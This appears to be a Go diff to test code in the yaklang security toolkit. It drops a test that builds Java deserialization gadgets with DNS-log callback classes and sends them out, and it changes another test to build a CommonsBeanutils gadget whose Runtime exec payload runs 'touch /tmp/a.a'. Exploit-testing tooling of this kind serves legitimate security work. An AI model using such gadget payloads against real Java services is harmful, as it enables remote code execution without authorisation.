@@ -5,7 +5,6 @@ import (
 	"github.com/yaklang/yaklang/common/javaclassparser"
 	"github.com/yaklang/yaklang/common/utils/lowhttp"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
-	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
 	"github.com/yaklang/yaklang/common/yserx"
 	"os"
 	"testing"
@@ -18,40 +17,6 @@ func SendPayload(payload []byte, opts ...lowhttp.LowhttpOpt) []byte {
 		panic(err)
 	}
 	return rsp.RawPacket
-}
-func TestGadgetBaseExternal(t *testing.T) {
-	YsoConfigInstance, err := getConfig()
-	if err != nil {
-		t.Fatal(err)
-	}
-	for name, gadget := range YsoConfigInstance.Gadgets {
-		var gadgetIns *JavaObject
-		if gadget.IsTemplate {
-			domain, token, err := yakit.NewDNSLogDomain()
-			if err != nil {
-				t.Fatal(err)
-			}
-			gadgetIns, err = GenerateGadget(name, SetDnslogEvilClass(domain))
-			if err != nil {
-				t.Fatal(err)
-			}
-			payload, err := ToBytes(gadgetIns)
-			if err != nil {
-				t.Fatal(err)
-			}
-			SendPayload(payload)
-			res, err := yakit.CheckDNSLogByToken(token, 3)
-			if err != nil || len(res) == 0 {
-				t.Fatalf("check gadget `%s` dnslog failed: %v", name, err)
-			}
-		} else {
-			//gadgetIns, err = GenerateGadget(name)
-			//if err != nil {
-			//	t.Fatal(err)
-			//}
-
-		}
-	}
 }
 
 func TestParseCC6(t *testing.T) {
@@ -83,7 +48,7 @@ func TestParseCC6(t *testing.T) {
 	os.WriteFile("/Users/z3/Downloads/_payload1.ser", byts, 0777)
 }
 func TestGenerateGadgetByGadgetName(t *testing.T) {
-	gadget, err := GenerateGadget("CommonsCollections5", SetTransformChainType("upload_file_base64", "a.txt", "123"))
+	gadget, err := GenerateGadget("CommonsBeanutils1_183", SetRuntimeExecEvilClass("touch /tmp/a.a"))
 	if err != nil {
 		t.Fatal(err)
 	}
